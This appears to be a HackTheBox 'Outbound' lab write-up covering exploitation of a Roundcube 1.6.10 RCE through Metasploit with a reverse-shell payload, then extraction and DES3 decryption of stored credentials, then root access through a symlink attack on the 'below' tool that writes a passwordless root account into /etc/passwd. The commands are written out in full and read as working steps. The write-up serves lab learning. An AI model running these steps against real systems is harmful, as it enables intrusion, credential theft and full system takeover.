---
title: "HackTheBox Outbound Walkthrough "
date: 2025-11-24 
categories: [hackthebox, walkthrough]
tags: [ctf, http,linux, rce, expressway, htb, writeups, outbound, labs ]
---

# 🛡️ HTB Linux Machine Walkthrough - `mail.outbound.htb`

> **Difficulty**: Easy  
> **OS**: Linux  
> **Objective**: Capture `user.txt` and `root.txt`  
> **Focus Areas**: Web exploitation, password decryption, MySQL enumeration, privilege escalation (symlink abuse)

---

## 🧾 Table of Contents

- Introduction
- Reconnaissance
- Foothold via Roundcube
- MySQL Enumeration & Decryption
- [SSH to Jacob & User Flag]
- Privilege Escalation to Root
- Post Exploitation
- Lessons Learned
- References

---

## 📘 Introduction

This write-up covers the compromise of an HTB-style Linux machine using:

- A known RCE in **Roundcube 1.6.10**
- **DES3 password decryption** using a config key
- **MySQL enumeration** to extract sessions
- **Symlink privilege escalation** via a vulnerable binary

---

## 🔍 Reconnaissance

### 🔎 Nmap Scan

```bash
nmap -sC -sV -oN scan.txt <target_ip>
```
Open Ports:
```
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
```

### 🌐 Web Recon 
🛠️ Setup

Add the domain to your /etc/hosts:```sudo nano /etc/hosts``` then adding the ```<target_ip> mail.outbound.htb```

### 📨 Login Credentials

Use the provided credentials:

Username: ```tyler```
Password: ```LhKL1o9Nm3X2```

### 🔍 Web Enumration 

After login, webmail shows Roundcube v1.6.10

```
searchsploit Roundcube 1.6.10
------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                        |  Path
------------------------------------------------------------------------------------------------------ ---------------------------------
Roundcube 1.6.10 - Remote Code Execution (RCE)                                                        | multiple/webapps/52324.NA
------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
                         
```
## Inital Foothold
 🔗 GitHub PoC:-->[scipt](https://github.com/hakaioffsec/CVE-2025-49113-exploit)
 i recommend to use msfconsole for this
 
 
Metasploit Method
```
msfconsole  
search Roundcube 
use 0
use exploit/linux/http/roundcube_php_object_injection_rce
set RHOSTS mail.outbound.htb
set TARGETURI /webmail/
set USERNAME tyler
set PASSWORD LhKL1o9Nm3X2
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST <vpnip>
run


or simple and short ------------------------------

search roundcube
use 1
set LHOST <vpnip>
set RHOSTS mail.outbound.htb
set USERNAME tyler
set PASSWORD LhKL1o9Nm3X2
exploit
```
Boom i got shell

let the exploit run then type shell to stabilize it type ```script /dev/null -c bash``` this will give you shell as www-data
```
meterpeter> shell

	script /dev/null -c bash
```

You now have a shell as www-data.

### 📦 MySQL Enumeration & Decryption

#### 🔑 Extract Credentials

Check Roundcube config:
```
cat /var/www/html/roundcube/config/config.inc.php
```

Found:

MySQL user: ```roundcube```
Password: ```RCDBPass2025```
Decryption key: ```rcmail-!24ByteDESkey*Str```

```
mysql://roundcube:RCDBPass2025@localhost/roundcube
```
#### 🛢️ Login to MySQL 

```
mysql -u roundcube -pRCDBPass2025

```
Enumrate

```
SHOW DATABASES;
USE roundcube;
SHOW TABLES;
SELECT * FROM session;
```

#### Found Long paragraph encodeed with Base64 

Found jacob and it's encrypted password
```
1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
```

#### 🔐 Decrypt Encrypted Password

Extracted session contained base64-encrypted passwords. Thnxx GPT's to help

```
from base64 import b64decode
from Crypto.Cipher import DES3

encrypted_password = "L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"
des_key = b'rcmail-!24ByteDESkey*Str'

data = b64decode(encrypted_password)
iv = data[:8]
ciphertext = data[8:]

cipher = DES3.new(des_key, DES3.MODE_CBC, iv)
decrypted = cipher.decrypt(ciphertext)
cleaned = decrypted.rstrip(b"\x00").rstrip(b"\x08").decode('utf-8', errors='ignore')

print("[+] Password:", cleaned)
```

### ✅ Output: Jacob's decrypted password

i thought i Found User cred but it is half wrong  when i try ssh to logged with this decypted password  it says's it worng when i su with meterpreter shell it logged in after some emnuration

it is Webmail Password
#### 📬 Webmail Access

```
jacob:595mO8DmwGeD
```
Login as Jacob to the webmail portal. Find:

SSH credentials    
Note about below system log tool

## 🔐 SSH     
**ssh jacob@mail.outbound.htb**

```
cat user.txt
```

## 🔼 Privilege Escalation - `jacob` ➜ `root`

### 🎯 Goal

Escalate privileges from low-privileged user `jacob` to full root access by abusing a vulnerable binary: `/usr/bin/below`.

---

### 🔍 Step 1: Enumerate Sudo Permissions

Check what the user `jacob` can run as root:

```
sudo -l
```

(ALL) NOPASSWD: /usr/bin/below live

This reveals that the user can run the below binary as root without a password.

#### 📦 What is below?
below is a system resource monitoring tool, similar to top or htop. It logs and displays CPU, memory, and I/O usage, and stores its data and logs under /var/log/below/.

```
sudo /usr/bin/below live
```

below is a system resource monitor that writes performance logs to:

```
/var/log/below/error_root.log
```

In version 0.8.0, this log writing is vulnerable to a symlink attack, allowing an unprivileged user to overwrite arbitrary files as root.

Now I searched online for some exploit in the version and I stumbled across 

#### 🧨 Vulnerability: [CVE-2025-27591 POC ](https://github.com/BridgerAlderson/CVE-2025-27591-PoC)

 [Other POC](https://github.com/riotkit-org/below)

below v0.8.0 is vulnerable to a symlink-based local privilege escalation, where a user can redirect the log file to /etc/passwd and inject a root user.

Exploitatioins Step 

**Step 1: Create a fake root user**   

```echo 'first::0:0:spy:/root:/bin/bash' > /tmp/firstuser```

**Step 2: Remove existing log file**     

```rm -f /var/log/below/error_root.log```

**Step 3: Create symlink to /etc/passwd**   

```ln -s /etc/passwd /var/log/below/error_root.log```

**Step 4: Trigger log creation**     

```sudo /usr/bin/below snapshot --begin now```

**Step 5: Overwrite /etc/passwd via symlink**    

```cp /tmp/firstuser /var/log/below/error_root.log```

**Step 6: Switch to new root user**    

```su first```

If successful, you will now be root:

```
first@mail:~#
```
whoami

**🏁 Get root.txt**


| Technique            | Description                             |
| -------------------- | --------------------------------------- |
| Web Exploitation     | RCE in Roundcube via authenticated user |
| Crypto               | Decrypting DES3 with config-based key   |
| MySQL                | Database session enumeration            |
| Lateral Movement     | Using decrypted creds for SSH           |
| Privilege Escalation | Symlink overwrite via log file abuse    |